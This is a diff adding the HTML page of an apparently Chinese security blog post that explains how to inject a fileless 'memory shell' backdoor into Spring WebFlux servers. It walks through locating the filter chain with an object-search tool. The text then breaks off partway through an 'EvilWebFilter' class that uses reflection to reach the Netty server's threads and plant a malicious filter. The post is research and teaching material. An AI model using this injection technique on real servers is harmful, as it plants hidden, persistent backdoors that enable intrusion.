@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言Spring框架中包含的原始Web框架Spring Web MVC是专门为Servlet API和Servlet容器构建的。响应式堆栈Web框架Spring WebFlux是在5.0版本中添加的，它完全非阻塞，支持Reactive Streams背压，运行在Netty、Undertow、Servlet容器等服务器上，它不依赖Servlet-API，但是同样具有Filter，即WebFilter">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring MemoryShell Of WebFlux">
+<meta property="og:url" content="https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/index.html">
+<meta property="og:site_name" content="H3rmesk1t">
+<meta property="og:description" content="前言Spring框架中包含的原始Web框架Spring Web MVC是专门为Servlet API和Servlet容器构建的。响应式堆栈Web框架Spring WebFlux是在5.0版本中添加的，它完全非阻塞，支持Reactive Streams背压，运行在Netty、Undertow、Servlet容器等服务器上，它不依赖Servlet-API，但是同样具有Filter，即WebFilter">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/1713508782136-e0fab9c3-e439-4905-98c9-8305209ba126.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/1713508910530-71fad0b9-5719-4463-ba12-83b927b72e61.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/1713512244450-219aecb1-7e92-4965-89ec-41c85c5671a3.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/1713512304094-be898fef-d208-4d90-8dec-cd2ee83f3cbd.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/1713514797436-a98990c9-0d4b-4eb6-b083-c87a5e02ffb4.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/1713518745557-17285471-7f80-4963-b5f3-2bd1b7cdeb0c.png">
+<meta property="article:published_time" content="2024-05-18T16:55:00.000Z">
+<meta property="article:modified_time" content="2024-10-18T07:29:45.089Z">
+<meta property="article:author" content="H3rmesk1t">
+<meta property="article:tag" content="MemoryShell">
+<meta property="article:tag" content="Spring">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/1713508782136-e0fab9c3-e439-4905-98c9-8305209ba126.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/my-logo-mosaic.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/my-logo-mosaic-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/my-logo-mosaic.png">
+        
+      
+    
+    <!-- title -->
+    <title>Spring MemoryShell Of WebFlux</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="H3rmesk1t" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/19/Spring-Interceptor/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&text=Spring MemoryShell Of WebFlux"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&title=Spring MemoryShell Of WebFlux"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&is_video=false&description=Spring MemoryShell Of WebFlux"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring MemoryShell Of WebFlux&body=Check out this article: https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&title=Spring MemoryShell Of WebFlux"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&title=Spring MemoryShell Of WebFlux"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&title=Spring MemoryShell Of WebFlux"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&title=Spring MemoryShell Of WebFlux"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&name=Spring MemoryShell Of WebFlux&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&t=Spring MemoryShell Of WebFlux"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">过程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">应用</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Spring MemoryShell Of WebFlux
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">H3rmesk1t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-18T16:55:00.000Z" class="dt-published" itemprop="datePublished">2024-05-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/MemoryShell/" rel="tag">MemoryShell</a>, <a class="p-category" href="/tags/Spring/" rel="tag">Spring</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring框架中包含的原始Web框架Spring Web MVC是专门为Servlet API和Servlet容器构建的。响应式堆栈Web框架Spring WebFlux是在5.0版本中添加的，它完全非阻塞，支持Reactive Streams背压，运行在Netty、Undertow、Servlet容器等服务器上，它不依赖Servlet-API，但是同样具有Filter，即WebFilter。</p>
+<p>WebFlux型内存马也算是一个变相的Filter类型的内存马，依旧还是通过动态注册WebFilter及映射路由来实现的，但是它的filters并没有存放在常见的filter集合中。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>新建一个SpringBoot项目，WEB选择Spring Reactive WEB。</p>
+<p><img src="/2024/05/19/Spring-WebFlux/1713508782136-e0fab9c3-e439-4905-98c9-8305209ba126.png" alt="image.png"></p>
+<ul>
+<li>创建Handler类，用于请求处理</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.BodyInserters;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerResponse;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Mono&lt;ServerResponse&gt; <span class="title function_">hello</span><span class="params">(ServerRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ServerResponse.ok().contentType(MediaType.TEXT_PLAIN)</span><br><span class="line">                .body(BodyInserters.fromValue(<span class="string">&quot;Hello Webflux!&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建Controller类</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RequestPredicates;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RouterFunction;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.RouterFunctions;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.server.ServerResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingRouter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RouterFunction&lt;ServerResponse&gt; <span class="title function_">route</span><span class="params">(GreetingHandler greetingHandler)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RouterFunctions.route(RequestPredicates.GET(<span class="string">&quot;/hello&quot;</span>).and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/05/19/Spring-WebFlux/1713508910530-71fad0b9-5719-4463-ba12-83b927b72e61.png" alt="image.png"></p>
+<h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>在GreetingHandler#hello方法中下断点，观察堆栈信息，发现org.springframework.web.reactive.DispatcherHandler#invokeHandler方法调用handle方法，根据URI分发处理handler。</p>
+<p><img src="/2024/05/19/Spring-WebFlux/1713512244450-219aecb1-7e92-4965-89ec-41c85c5671a3.png" alt="image.png"></p>
+<p><img src="/2024/05/19/Spring-WebFlux/1713512304094-be898fef-d208-4d90-8dec-cd2ee83f3cbd.png" alt="image.png"></p>
+<p>由于WebFlux型内存马注入，依旧是需要动态注册一个Filter及映射路由，对于路由创建一般有两种方式：</p>
+<ol>
+<li>通过提供的API进行调用，进而能够动态的创建内存马，例如Spring Controller型内存马，主要就是通过RequestMappingHandlerMapping#registerMapping方法进行动态的注册</li>
+<li>通过反射的方法进行获取类似servlets&#x2F;filters等存放servlet&#x2F;filter的属性，之后将自定义的类添加进入这个属性中</li>
+</ol>
+<p>这里可以利用工具Java-Object-Searcher来查看自定义的WebFilter在Thread的哪个位置，从而确定注入点，自定义一个如下的WebFilter，接着访问路由，观察自定义的WebFilter在Thread的哪个位置。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyWebFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain)</span> &#123;</span><br><span class="line">        List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;MyWebFilter&quot;</span>).build());</span><br><span class="line">        List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());</span><br><span class="line">        <span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);</span><br><span class="line">        searcher.setBlacklists(blacklists);</span><br><span class="line">        searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line">        searcher.setMax_search_depth(<span class="number">15</span>);</span><br><span class="line">        searcher.setReport_save_path(<span class="string">&quot;/Users/alphag0/Desktop/&quot;</span>);</span><br><span class="line">        searcher.searchObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;MyWebFilter.....&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> webFilterChain.filter(serverWebExchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先在MyWebFilter中下个断点，观察堆栈信息，发现是从DefaultWebFilterChain#invokeFilter方法中来获取自定义的WebFilter的，因此在前面对象搜索的结果中搜索关键词DefaultWebFilterChain，得到如下的结果，完整的获取到了filter储存的位置。</p>
+<p><img src="/2024/05/19/Spring-WebFlux/1713514797436-a98990c9-0d4b-4eb6-b083-c87a5e02ffb4.png" alt="image.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;reactor.netty.resources.DefaultLoopResources$EventLoop&#125; </span><br><span class="line">   ---&gt; group = &#123;java.lang.ThreadGroup&#125; </span><br><span class="line">    ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; </span><br><span class="line">     ---&gt; [<span class="number">2</span>] = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer$<span class="number">1</span>&#125; </span><br><span class="line">      ---&gt; <span class="built_in">this</span>$<span class="number">0</span> = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer&#125; </span><br><span class="line">       ---&gt; handler = &#123;org.springframework.http.server.reactive.ReactorHttpHandlerAdapter&#125; </span><br><span class="line">        ---&gt; httpHandler = &#123;org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler&#125; </span><br><span class="line">         ---&gt; delegate = &#123;org.springframework.web.server.adapter.HttpWebHandlerAdapter&#125; </span><br><span class="line">          ---&gt; delegate = &#123;org.springframework.web.server.handler.ExceptionHandlingWebHandler&#125; </span><br><span class="line">            ---&gt; delegate = &#123;org.springframework.web.server.handler.FilteringWebHandler&#125; </span><br><span class="line">             ---&gt; chain = &#123;org.springframework.web.server.handler.DefaultWebFilterChain&#125; </span><br><span class="line">              ---&gt; allFilters = &#123;java.util.List&lt;org.springframework.web.server.WebFilter&gt;&#125; </span><br><span class="line">               ---&gt; [<span class="number">0</span>] = &#123;com.example.webfluxmemoryshell.index.MyWebFilter&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上文搜索结果中可以看到，所有filter都被储存在了chain属性里，然后chain属性是被存在FilteringWebHandler里面，要注入的话就得添加一个恶意的chain进去，至于为什么不添加一个Filter到allFilters属性中，可以参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11331?time__1311=mqmx0DyDBD9DniDcDBqQqO4+xpLrTWFKqwrID&alichlgref=https://www.google.com.hk/#toc-4:~:text=%22request%22">从CVE-2022-22947到Spring WebFlux内存马与哥斯拉</a>%3B-,Spring%20WebFilter%E5%86%85%E5%AD%98%E9%A9%AC,-%E5%89%8D%E9%9D%A2%E6%8F%90%E5%88%B0Controller)。</p>
+<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.webfluxmemoryshell.index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.embedded.netty.NettyWebServer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DataBuffer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DefaultDataBufferFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.adapter.HttpWebHandlerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.DefaultWebFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.ExceptionHandlingWebHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.FilteringWebHandler;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Flux;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilWebFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (exchange.getRequest().getURI().getPath().startsWith(<span class="string">&quot;/evil/&quot;</span>)) &#123;</span><br><span class="line">            inject();</span><br><span class="line">            Flux&lt;DataBuffer&gt; response = getPost(exchange);</span><br><span class="line">            <span class="type">ServerHttpResponse</span> <span class="variable">serverHttpResponse</span> <span class="operator">=</span> exchange.getResponse();</span><br><span class="line">            serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);</span><br><span class="line">            <span class="keyword">return</span> serverHttpResponse.writeWith(response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getThreads</span> <span class="operator">=</span> Thread.class.getDeclaredMethod(<span class="string">&quot;getThreads&quot;</span>);</span><br><span class="line">            getThreads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">threads</span> <span class="operator">=</span> getThreads.invoke(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Array.getLength(threads); i++) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Array.get(threads, i);</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getClass().getName().contains(<span class="string">&quot;NettyWebServer&quot;</span>)) 